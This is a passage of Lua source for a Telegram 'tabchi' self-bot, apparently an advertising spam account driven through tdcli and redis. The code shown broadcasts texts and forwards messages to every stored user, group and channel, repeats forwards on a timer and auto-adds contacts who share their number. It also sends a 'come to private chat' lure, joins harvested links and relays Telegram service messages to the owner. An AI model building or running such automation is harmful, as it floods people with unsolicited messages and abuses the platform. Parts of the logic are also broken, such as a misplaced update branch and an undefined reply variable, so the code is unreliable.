        joinlimit = redis:get(basehash .. "joinlimit")
      end
      local text = "Added Message : " .. addedmsg .. [[

Text : ]] .. addedmsgtext .. [[

----------
Added Contact : ]] .. addedcontact .. [[

----------
Markread : ]] .. markread .. [[

----------
Join Links : ]] .. joinlinks .. [[

Join Limit : ]] .. joinlimit .. [[

---------
Save Links : ]] .. savelinks .. [[

----------
Add Contacts : ]] .. addcontacts .. [[

---------
Auto Answer : ]] .. autoanswer .. [[

----------
Typing : ]] .. typing
      return text
    elseif text_:match("^[!/#](bc) (.*)") then
      local matches = {
        text_:match("^[!/#](bc) (.*)")
      }
      if #matches == 2 then
        local all = redis:smembers(basehash .. "all")
        for i, v in pairs(all) do
          tdcli_function({
            ID = "SendMessage",
            chat_id_ = v,
            reply_to_message_id_ = 0,
            disable_notification_ = 0,
            from_background_ = 1,
            reply_markup_ = nil,
            input_message_content_ = {
              ID = "InputMessageText",
              text_ = matches[2],
              disable_web_page_preview_ = 0,
              clear_draft_ = 0,
              entities_ = {},
              parse_mode_ = {
                ID = "TextParseModeHTML"
              }
            }
          }, dl_cb, nil)
        end
        save_log("User " .. msg.sender_user_id_ .. ", Used BC, Content " .. matches[2])
        return "Sent!"
      end
    elseif text_:match("^[!/#](timefwd) (%d+) (%d+)$") and msg.reply_to_message_id_ ~= 0 then
      local matches = {
        text_:match("^[!/#](timefwd) (%d+) (%d+)$")
      }
      if #matches == 3 then
        local time = tonumber(matches[2]) * 60
        local timetosend = tonumber(matches[3])
        local id = msg.reply_to_message_id_
        redis:setex(basehash .. id .. "notsend", time, true)
        redis:set(basehash .. id .. "times", timetosend)
        redis:sadd(basehash .. "timeforwards", id)
        redis:set(basehash .. id .. "fromchatid", msg.chat_id_)
        redis:set(basehash .. id .. "ttl", time)
        save_log("User " .. msg.sender_user_id_ .. ", Added a Time Forward")
        return "I Will Forward This Message Every " .. matches[2] .. " Minutes " .. matches[3] .. [[
 Times
Time Forward ID : ]] .. id
      end
    elseif text_:match("^[!/#](timefwds)$") then
      local text = "Time Forward Processes : \n"
      local all = redis:smembers(basehash .. "timeforwards")
      for i = 1, #all do
        text = text .. i .. ". ID : " .. all[i] .. ", Every " .. redis:get(basehash .. all[i] .. "ttl") / 60 .. " Minutes " .. redis:get(basehash .. all[i] .. "times") .. " Times"
      end
      save_log("User " .. msg.sender_user_id_ .. ", Requested Time Forwards List")
      return text
    elseif text_:match("^[!/#](deltimefwd) (%d+)$") then
      local matches = {
        text_:match("^[!/#](deltimefwd) (%d+)$")
      }
      if #matches == 2 then
        redis:srem(basehash .. "timeforwards", matches[2])
        redis:del(basehash .. matches[2] .. "*")
        save_log("User " .. msg.sender_user_id_ .. ", Deleted a Time Forward")
        return "Time Forward Deleted!"
      end
    elseif text_:match("^[!/#](sendtimefwd) (%d+)$") then
      local matches = {
        text_:match("^[!/#](sendtimefwd) (%d+)$")
      }
      if #matches == 2 and redis:get(basehash .. matches[2] .. "fromchatid") then
        tdcli_function({
          ID = "ForwardMessages",
          chat_id_ = msg.chat_id_,
          from_chat_id_ = redis:get(basehash .. matches[2] .. "fromchatid"),
          message_ids_ = {
            [0] = tonumber(matches[2])
          },
          disable_notification_ = 0,
          from_background_ = 1
        }, dl_cb, nil)
      end
    elseif text_:match("^[!/#](fwd) (.*)$") then
      local matches = {
        text_:match("^[!/#](fwd) (.*)$")
      }
      if #matches == 2 then
        if matches[2] == "all" then
          local all = redis:smembers(basehash .. "all")
          local id = msg.reply_to_message_id_
          for i, v in pairs(all) do
            tdcli_function({
              ID = "ForwardMessages",
              chat_id_ = v,
              from_chat_id_ = msg.chat_id_,
              message_ids_ = {
                [0] = id
              },
              disable_notification_ = 0,
              from_background_ = 1
            }, dl_cb, nil)
          end
          save_log("User " .. msg.sender_user_id_ .. ", Used Fwd All")
        elseif matches[2] == "usrs" then
          local all = redis:smembers(basehash .. "pvis")
          local id = msg.reply_to_message_id_
          for i, v in pairs(all) do
            tdcli_function({
              ID = "ForwardMessages",
              chat_id_ = v,
              from_chat_id_ = msg.chat_id_,
              message_ids_ = {
                [0] = id
              },
              disable_notification_ = 0,
              from_background_ = 1
            }, dl_cb, nil)
          end
          save_log("User " .. msg.sender_user_id_ .. ", Used Fwd Users")
        elseif matches[2] == "gps" then
          local all = redis:smembers(basehash .. "groups")
          local id = msg.reply_to_message_id_
          for i, v in pairs(all) do
            tdcli_function({
              ID = "ForwardMessages",
              chat_id_ = v,
              from_chat_id_ = msg.chat_id_,
              message_ids_ = {
                [0] = id
              },
              disable_notification_ = 0,
              from_background_ = 1
            }, dl_cb, nil)
          end
          save_log("User " .. msg.sender_user_id_ .. ", Used Fwd Gps")
        elseif matches[2] == "sgps" then
          local all = redis:smembers(basehash .. "channels")
          local id = msg.reply_to_message_id_
          for i, v in pairs(all) do
            tdcli_function({
              ID = "ForwardMessages",
              chat_id_ = v,
              from_chat_id_ = msg.chat_id_,
              message_ids_ = {
                [0] = id
              },
              disable_notification_ = 0,
              from_background_ = 1
            }, dl_cb, nil)
          end
          save_log("User " .. msg.sender_user_id_ .. ", Used Fwd Sgps")
        end
      end
      return "Sent!"
    end
  end
end
function update(data, tabchi_id)
  basehash = "tabchi:" .. tabchi_id .. ":"
  if data.ID == "UpdateNewMessage" then
    msg = data.message_
    add(msg.chat_id_)
    if msg.sender_user_id_ == 777000 then
      local text = removenumbers(msg.content_.text_)
      local sudo = tonumber(redis:get(basehash .. "fullsudo"))
      tdcli.sendMessage(sudo, 0, 1, text, 1, "html")
    end
    if redis:get(basehash .. "fwdallers:" .. msg.chat_id_) then
      local all = redis:smembers(basehash .. "all")
      for i, v in pairs(all) do
        tdcli_function({
          ID = "ForwardMessages",
          chat_id_ = v,
          from_chat_id_ = msg.chat_id_,
          message_ids_ = {
            [0] = msg.id_
          },
          disable_notification_ = 0,
          from_background_ = 1
        }, dl_cb, nil)
      end
    end
    if not msg.content_.text_ then
      if msg.content_.caption_ then
        msg.content_.text_ = msg.content_.caption_
      elseif msg.content_.photo_ then
        msg.content_.text_ = "!!PHOTO!!"
      elseif msg.content_.document_ then
        msg.content_.text_ = "!!DOCUMENT!!"
      elseif msg.content_.audio_ then
        msg.content_.text_ = "!!AUDIO!!"
      elseif msg.content_.animation_ then
        msg.content_.text_ = "!!ANIMATION!!"
      elseif msg.content_.video_ then
        msg.content_.text_ = "!!VIDEO!!"
      elseif msg.content_.contact_ then
        msg.content_.text_ = "!!CONTACT!!"
      end
    end
    if redis:get(basehash .. "markread") then
      tdcli.viewMessages(msg.chat_id_, {
        [0] = msg.id_
      })
    end
    if not redis:get(basehash .. "botinfo") then
      tdcli_function({ID = "GetMe"}, our_id, nil)
    end
    text_ = msg.content_.text_
    local botinfo = JSON.decode(redis:get(basehash .. "botinfo"))
    our_id = botinfo.id_
    if msg.content_.ID == "MessageText" then
      local result = process_updates(msg)
      if result then
        if redis:get(basehash .. "typing") then
          tdcli.sendChatAction(msg.chat_id_, "Typing", 100)
        end
        tdcli.sendMessage(msg.chat_id_, msg.id_, 1, result, 1, "html")
      end
      process_links(text_)
      if redis:sismember(basehash .. "answerslist", msg.content_.text_:lower()) and msg.sender_user_id_ ~= our_id then
        local answer = redis:hget(basehash .. "answers", msg.content_.text_:lower())
        if not redis:get(basehash .. "notautochat") then
          if redis:get(basehash .. "typing") then
            tdcli.sendChatAction(msg.chat_id_, "Typing", 100)
          end
          tdcli.sendMessage(msg.chat_id_, msg.id_, 1, answer, 1, "html")
        end
      end
    elseif msg.content_.ID == "MessageContact" then
      if msg.sender_user_id_ ~= our_id and msg.content_.contact_.user_id_ ~= our_id and not redis:sismember(basehash .. "addedcontacts", msg.content_.contact_.user_id_) then
        if not redis:get(basehash .. "notaddcontacts") then
          tdcli.add_contact(msg.content_.contact_.phone_number_, msg.content_.contact_.first_name_ or "-", msg.content_.contact_.last_name_ or "-", msg.content_.contact_.user_id_)
          redis:sadd(basehash .. "addedcontacts", msg.content_.contact_.user_id_)
        end
        if redis:get(basehash .. "addedmsg") then
          local answer = redis:get(basehash .. "addedmsgtext") or [[
Addi
Bia pv]]
          if redis:get(basehash .. "typing") then
            tdcli.sendChatAction(msg.chat_id_, "Typing", 100)
          end
          tdcli.sendMessage(msg.chat_id_, msg.id_, 1, answer, 1, "html")
        end
        if redis:get(basehash .. "addedcontact") then
          return tdcli.sendContact(msg.chat_id_, msg.id_, 0, 0, nil, botinfo.phone_number_, botinfo.first_name_, botinfo.last_name_, botinfo.id_)
        end
      end
    elseif msg.content_.ID == "MessageChatDeleteMember" and msg.content_.id_ == our_id then
      return rem(msg.chat_id_)
    elseif data.ID == "UpdateChat" then
      if not redis:sismember(basehash .. "all", data.chat_id_) then
        tdcli.sendMessage(msg.chat_id_, msg.id_, 1, answer, 1, "html")
      end
    elseif data.ID == "UpdateOption" and data.name_ == "my_id" then
      tdcli.getChats("9223372036854775807", 0, 20)
    end
  end
end
return {
  update = update
}
